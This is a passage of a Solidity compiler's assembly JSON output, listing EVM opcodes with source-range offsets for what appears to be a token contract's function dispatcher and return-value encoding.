											"end": 14573,
											"name": "SWAP1"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "PUSH [tag]",
											"value": "46"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "JUMPDEST"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "STOP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP6"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "49"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "51"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP4"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP3"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "49"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "51"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "AND"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ISZERO"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH [tag]",
											"value": "52"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPI"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SUB"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SUB"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "EXP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SUB"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "NOT"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "AND"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "tag",
											"value": "52"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SUB"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "RETURN"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "JUMPDEST"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "PUSH [tag]",
											"value": "53"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "tag",
											"value": "53"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "JUMPDEST"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "SWAP5"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "DUP6"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "AND"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "SWAP3"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "SWAP1"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "SWAP4"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "AND"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "DUP4"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "AND"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "DUP4"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "SWAP1"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "MLOAD"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "SWAP1"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "SWAP1"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "SUB"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "SWAP1"
										},
										{
											"begin": 1393,
											"end": 1694,
											"name": "RETURN"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMPDEST"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP2"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "AND"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "ADD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "tag",
											"value": "55"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMPDEST"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "MLOAD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP2"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "ISZERO"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "ISZERO"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP3"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "MSTORE"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "MLOAD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP2"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SUB"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "ADD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "RETURN"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "JUMPDEST"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "PUSH [tag]",
											"value": "59"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "tag",
											"value": "58"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "JUMPDEST"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "DUP1"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "SWAP1"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "SWAP3"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "AND"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "DUP3"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "MSTORE"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "MLOAD"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "SWAP1"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "DUP2"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "SWAP1"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "SUB"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "ADD"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "SWAP1"
										},
										{
											"begin": 700,
											"end": 721,
											"name": "RETURN"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "JUMPDEST"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "DUP1"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "61"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "61"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "DUP2"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "DUP2"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "AND"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "SWAP2"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "DUP2"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "ADD"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "SWAP1"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "SWAP2"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "AND"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "SWAP1"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "ADD"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "PUSH [tag]",
											"value": "62"
										},
										{
											"begin": 2591,
											"end": 2865,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMPDEST"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "tag",
											"value": "63"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMPDEST"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "DUP1"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "MLOAD"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SWAP2"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "DUP3"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "MSTORE"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "MLOAD"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SWAP1"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "DUP2"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SWAP1"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SUB"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "ADD"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SWAP1"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "RETURN"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "JUMPDEST"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "DUP1"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "66"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "DUP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "DUP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "AND"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "DUP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "ADD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP1"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "AND"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP1"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "ADD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH [tag]",
											"value": "67"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "JUMPDEST"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "PUSH [tag]",
											"value": "69"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMPDEST"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH [tag]",
											"value": "71"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "tag",
											"value": "70"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMPDEST"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "DUP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "MLOAD"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP3"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "AND"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "DUP3"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "MSTORE"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "MLOAD"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "DUP2"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SUB"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "ADD"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "RETURN"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "JUMPDEST"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "PUSH [tag]",
											"value": "73"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "JUMPDEST"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "DUP1"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "75"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
